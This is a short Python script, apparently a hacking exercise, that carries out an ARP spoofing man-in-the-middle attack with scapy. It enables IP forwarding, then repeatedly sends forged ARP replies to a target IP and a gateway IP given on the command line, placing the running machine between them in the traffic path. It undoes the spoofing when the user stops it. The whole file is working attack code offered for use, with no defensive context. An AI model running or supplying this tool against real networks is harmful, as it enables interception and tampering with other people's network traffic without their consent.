import subprocess as sp
import optparse
import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether, srp
import time

sp.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def mac_address(ip):
    arpreqpack = ARP(pdst=ip)
    broadcastpack = Ether(dst="ff:ff:ff:ff:ff:ff")
    packs = broadcastpack / arpreqpack
    anslist = srp(packs, timeout=1, verbose=False)[0]

    return anslist[0][1].hwsrc


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = mac_address(target_ip)

    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def reset(fooled_ip, gateway_ip):
    fooled_mac = mac_address(fooled_ip)
    gateway_mac = mac_address(gateway_ip)

    arp_response = ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=6)


def ip_address_inputs():
    parse_object = optparse.OptionParser()

    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway_ip", dest="gateway_ip", help="Enter Gateway IP")

    inputs = parse_object.parse_args()[0]

    if not inputs.target_ip:
        print("Enter a Target IP")
    if not inputs.gateway_ip:
        print("Enter a Gateway IP")
    return inputs


number = 0

get_ips = ip_address_inputs()
target = get_ips.target_ip
gateway = get_ips.gateway_ip

try:
    while True:
        arp_poisoning(target, gateway)
        arp_poisoning(gateway, target)

        number += 5
        print("\rSending Packets " + str(number), end="")

        time.sleep(5)
except KeyboardInterrupt:

    reset(target, gateway)
    reset(gateway, target)

    print("\nReset&Quit")
